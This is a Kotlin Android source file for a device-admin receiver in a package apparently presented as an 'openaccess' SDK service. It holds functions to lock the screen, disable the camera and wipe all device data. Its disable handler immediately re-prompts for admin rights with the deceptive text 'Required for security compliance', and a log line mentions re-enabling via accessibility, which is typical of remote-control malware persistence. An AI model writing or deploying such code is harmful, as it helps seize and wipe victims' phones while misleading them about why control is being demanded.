package com.openaccess.sdk.service

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

class AdminReceiver : DeviceAdminReceiver() {
    companion object {
        private const val TAG = "AdminReceiver"

        fun getComponent(ctx: Context): ComponentName {
            return ComponentName(ctx, AdminReceiver::class.java)
        }

        fun isActive(ctx: Context): Boolean {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            return dpm.isAdminActive(getComponent(ctx))
        }

        fun lockScreen(ctx: Context) {
            try {
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                if (isActive(ctx)) dpm.lockNow()
            } catch (e: Exception) {
                Log.e(TAG, "lockScreen: ${e.message}")
            }
        }

        fun disableCamera(ctx: Context, disabled: Boolean) {
            try {
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                if (isActive(ctx) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    dpm.setCameraDisabled(getComponent(ctx), disabled)
                }
            } catch (e: Exception) {
                Log.e(TAG, "disableCamera: ${e.message}")
            }
        }

        fun wipeDevice(ctx: Context) {
            try {
                val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                if (isActive(ctx)) dpm.wipeData(0)
            } catch (e: Exception) {
                Log.e(TAG, "wipeDevice: ${e.message}")
            }
        }
    }

    override fun onEnabled(context: Context, intent: Intent) {
        Log.i(TAG, "Device admin enabled")
    }

    override fun onDisabled(context: Context, intent: Intent) {
        Log.w(TAG, "Device admin disabled — re-enabling via accessibility")
        try {
            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val comp = getComponent(context)
            if (!dpm.isAdminActive(comp)) {
                val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for security compliance")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    val pi = android.app.PendingIntent.getActivity(context, 0, i,
                        android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE)
                    context.startIntentSender(pi.intentSender, null, 0, 0, 0)
                } else {
                    context.startActivity(i)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "re-enable: ${e.message}")
        }
    }

    override fun onPasswordChanged(context: Context, intent: Intent) {
        Log.i(TAG, "Device password changed")
    }

    override fun onLockTaskModeExiting(context: Context, intent: Intent) {
        Log.i(TAG, "Lock task mode exited")
    }
}
